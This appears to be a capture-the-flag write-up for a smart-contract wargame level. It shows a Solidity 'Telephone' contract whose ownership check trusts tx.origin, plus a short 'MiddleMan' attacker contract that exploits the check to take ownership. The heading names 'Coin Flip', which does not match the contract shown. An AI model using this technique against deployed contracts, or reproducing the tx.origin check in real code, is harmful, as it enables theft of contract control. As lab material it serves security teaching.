# Level 3 - Coin Flip

### Objective

The objective of this level is as follows:

1. Claim ownership of the contract

### Contract

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```

### Solution

As we can see in the contract above, the `changeOwner` function can be used to claim ownership of the contract if the transaction origin address is not the same as the message sender address. So, we must call `changeOwner` from a separate smart contract `MiddleMan` (seen below) so that `tx-origin` is our address and `msg.sender` is `MiddleMan`'s address.

```
pragma solidity ^0.6.0;

interface Tele {
  function changeOwner(address _owner) external;
}

contract MiddleMan {
  function changeOwner(address _addr) public {
    Tele(_addr).changeOwner(msg.sender);
  }
}
```

We deploy `MiddleMan` and enter the `Telephone` contract address as a parameter.

Done!
